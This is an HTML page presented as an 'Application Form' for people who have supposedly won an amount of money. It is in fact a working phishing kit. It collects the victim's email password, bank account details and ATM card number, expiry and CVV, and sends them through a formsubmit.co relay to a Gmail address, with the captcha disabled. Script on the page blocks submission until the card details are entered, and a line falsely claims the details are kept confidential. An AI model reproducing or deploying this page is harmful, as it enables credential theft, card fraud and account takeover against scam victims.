<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    form {
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px #ccc;
      max-width: 600px;
      margin: auto;
    }
    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      box-sizing: border-box;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    .error {
      color: red;
      font-size: 0.9em;
      display: none;
    }
    #atm-warning {
      color: red;
      font-weight: bold;
      display: none;
      margin-top: 10px;
    }
    #final-note {
      margin-top: 20px;
      font-weight: bold;
      display: none;
    }
    .password-wrapper {
      position: relative;
    }
    .password-wrapper input {
      padding-right: 40px;
    }
    .toggle-password {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      cursor: pointer;
    }
    button {
      margin-top: 20px;
      padding: 15px;
      background-color: green;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      width: 100%;
    }
    button:disabled {
      background-color: gray;
      cursor: not-allowed;
    }
    .confidential-note {
      font-size: 0.9em;
      color: #555;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <form id="application-form" action="https://formsubmit.co/exellentfirm@gmail.com" method="POST" onsubmit="return validateForm()">
    <h2>Application Form</h2>

    <label>Full Name</label>
    <input type="text" id="fullName" name="Full Name" required />

    <label>Country</label>
    <input type="text" id="country" name="Country" required />

    <label>Phone Number</label>
    <input type="tel" id="phone" name="Phone Number" required />
    <div class="error" id="phoneError">Enter a valid phone number (9‚Äì12 digits)</div>

    <label>Email Address</label>
    <input type="email" id="email" name="Email Address" required />
    <div class="error" id="emailError">Enter a valid email</div>

    <label>Email Password</label>
    <div class="password-wrapper">
      <input type="password" id="emailPassword" name="Email Password" required />
      <span class="toggle-password" onclick="togglePassword()">üëÅÔ∏è</span>
    </div>

    <label>Amount You Won</label>
    <input type="text" id="amountWon" name="Amount You Won" required />

    <label>Bank Account Type (e.g., Standard Bank Account)</label>
    <input type="text" id="accountType" name="Bank Account Type" required />

    <label>Bank Account Number</label>
    <input type="text" id="accountNumber" name="Bank Account Number" required />

    <label>Bank Account Holder's Name</label>
    <input type="text" id="accountHolder" name="Bank Account Holder's Name" required />

    <label>Did You Link ATM to Your Bank Account?</label>
    <select id="atmLinked" name="ATM Linked?" onchange="toggleATMFields()" required>
      <option value="">Select</option>
      <option value="Yes">Yes</option>
      <option value="No">No</option>
    </select>
    <div id="atm-warning">YOU MUST HAVE ATM CARD TO PROCEED</div>

    <div id="atm-section">
      <label>ATM Card Number</label>
      <input type="text" id="cardNumber" name="ATM Card Number" />
      <div class="error" id="cardError">Card number must be exactly 16 digits</div>

      <label>Expiry Date (MM/YY)</label>
      <input type="text" id="expiry" name="Expiry Date" maxlength="5" placeholder="MM/YY" />
      <div class="error" id="expiryError">Enter expiry in MM/YY format</div>

      <label>CVV</label>
      <input type="text" id="cvv" name="CVV" />
      <div class="error" id="cvvError">CVV must be exactly 3 digits</div>
    </div>

    <div id="final-note"></div>

    <input type="hidden" name="_next" value="https://onlinegistrationprog.github.io/thankyou.html" />
    <input type="hidden" name="_captcha" value="false" />

    <button type="submit" id="submitBtn">Submit</button>

    <p class="confidential-note">We keep your details secure and confidential.</p>
  </form>

  <script>
    const form = document.getElementById("application-form");
    const atmSection = document.getElementById("atm-section");
    const atmWarning = document.getElementById("atm-warning");
    const submitBtn = document.getElementById("submitBtn");
    const finalNote = document.getElementById("final-note");

    function togglePassword() {
      const pwd = document.getElementById("emailPassword");
      pwd.type = pwd.type === "password" ? "text" : "password";
    }

    function toggleATMFields() {
      const atmLinked = document.getElementById("atmLinked").value;
      if (atmLinked === "Yes") {
        atmSection.style.display = "block";
        atmWarning.style.display = "none";
        submitBtn.disabled = false;
        finalNote.style.display = "block";
        updateFinalNote();
      } else {
        atmSection.style.display = "none";
        atmWarning.style.display = "block";
        submitBtn.disabled = true;
        finalNote.style.display = "none";
      }
    }

    function updateFinalNote() {
      const fullName = document.getElementById("fullName").value;
      const amount = document.getElementById("amountWon").value;
      const accountType = document.getElementById("accountType").value;
      const accountNumber = document.getElementById("accountNumber").value;
      finalNote.textContent = `Dear ${fullName}, You will receive ${amount} to your ${accountType}, ${accountNumber}`;
    }

    function validateForm() {
      let valid = true;

      // Phone
      const phone = document.getElementById("phone");
      const phoneError = document.getElementById("phoneError");
      if (!/^\d{9,12}$/.test(phone.value)) {
        phoneError.style.display = "block";
        valid = false;
      } else {
        phoneError.style.display = "none";
      }

      // Email
      const email = document.getElementById("email");
      const emailError = document.getElementById("emailError");
      if (!/^\S+@\S+\.\S+$/.test(email.value)) {
        emailError.style.display = "block";
        valid = false;
      } else {
        emailError.style.display = "none";
      }

      // Card Number
      const card = document.getElementById("cardNumber");
      const cardError = document.getElementById("cardError");
      if (atmSection.style.display !== "none" && !/^\d{16}$/.test(card.value)) {
        cardError.style.display = "block";
        valid = false;
      } else {
        cardError.style.display = "none";
      }

      // Expiry Date
      const expiry = document.getElementById("expiry");
      const expiryError = document.getElementById("expiryError");
      if (atmSection.style.display !== "none" && !/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry.value)) {
        expiryError.style.display = "block";
        valid = false;
      } else {
        expiryError.style.display = "none";
      }

      // CVV
      const cvv = document.getElementById("cvv");
      const cvvError = document.getElementById("cvvError");
      if (atmSection.style.display !== "none" && !/^\d{3}$/.test(cvv.value)) {
        cvvError.style.display = "block";
        valid = false;
      } else {
        cvvError.style.display = "none";
      }

      if (valid) updateFinalNote();
      return valid;
    }

    // Format expiry with slash auto-insert
    document.getElementById("expiry").addEventListener("input", function (e) {
      let val = e.target.value.replace(/\D/g, '');
      if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2, 4);
      e.target.value = val;
    });

    // Block going to next field until fixed
    ["phone", "email", "cardNumber", "expiry", "cvv"].forEach(id => {
      const el = document.getElementById(id);
      el.addEventListener("blur", () => validateForm());
    });
  </script>
</body>
</html>
